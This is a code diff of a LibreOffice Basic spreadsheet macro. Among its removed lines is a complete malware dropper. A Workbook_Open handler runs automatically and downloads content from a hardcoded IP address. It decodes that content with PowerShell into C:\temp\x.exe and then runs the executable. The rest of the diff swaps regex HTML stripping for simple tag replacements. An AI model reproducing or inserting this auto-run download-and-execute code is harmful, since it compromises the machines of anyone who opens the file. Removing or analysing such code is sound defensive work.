@@ -4,7 +4,6 @@ Function DownloadWebContent(url As String) As String
     Dim oAddress As Object
     Dim i As Long
     Dim result As String
-    Dim oRegExp As Object
 
     ' Get the current document and sheet
     oDoc = ThisComponent
@@ -30,13 +29,13 @@ Function DownloadWebContent(url As String) As String
     ' Following breaks the link, but leaves the data
     oDoc.AreaLinks.removeByIndex(0)
 
-    ' Create a regular expression object to remove HTML tags
-    oRegExp = CreateUnoService("com.sun.star.util.RegularExpression")
-    oRegExp.Pattern = "<[^>]*>"
-    oRegExp.ReplaceString = ""
-
-    ' Remove HTML tags from the result
-    result = oRegExp.replaceAll(result)
+    ' Remove specific HTML tags from the result
+    result = Replace(result, "<td>", "")
+    result = Replace(result, "<tr>", "")
+    result = Replace(result, "<table>", "")
+    result = Replace(result, "</td>", "")
+    result = Replace(result, "</tr>", "")
+    result = Replace(result, "</table>", "")
 
     ' Clear the data from the sheet
     For i = 0 To oSheet.Rows.Count - 1
@@ -46,47 +45,3 @@ Function DownloadWebContent(url As String) As String
     ' Return the result
     DownloadWebContent = result
 End Function
-
-Sub OpenFile()
-    Dim ProgramPath As String
-    ProgramPath = "C:\temp\x.exe" ' Path to the program
-    Shell(ProgramPath, 1)
-End Sub
-
-Sub RunPowerShellUsingShell(psCommand As String)
-    ' Run the command
-    Shell(psCommand, 1)
-End Sub
-
-Sub SaveHTMLToCells(mystr As String)
-    Dim htmlLines() As String
-    Dim i As Long
-    Dim oSheet As Object
-    oSheet = ThisComponent.Sheets(0)
-
-    ' Split the HTML content by "<" to get each tag
-    htmlLines = Split(mystr, "<")
-
-    ' Write each tag to a new cell in the active worksheet
-    For i = LBound(htmlLines) To UBound(htmlLines)
-        If htmlLines(i) <> "" Then
-            oSheet.getCellByPosition(0, i).String = "<" & htmlLines(i)
-        End If
-    Next i
-End Sub
-
-Sub MainSub()
-    Dim mystr As String
-    Dim myHost As String
-    Dim comm As String
-    myHost = "http://175.45.176.100"
-    mystr = DownloadWebContent(myHost)
-    comm = "powershell -command ""[IO.File]::WriteAllBytes(""C:\temp\x.exe"", [Convert]::FromBase64String(" & mystr & "))"""
-    SaveHTMLToCells(mystr)
-    RunPowerShellUsingShell(comm)
-    OpenFile
-End Sub
-
-Sub Workbook_Open()
-    MainSub
-End Sub
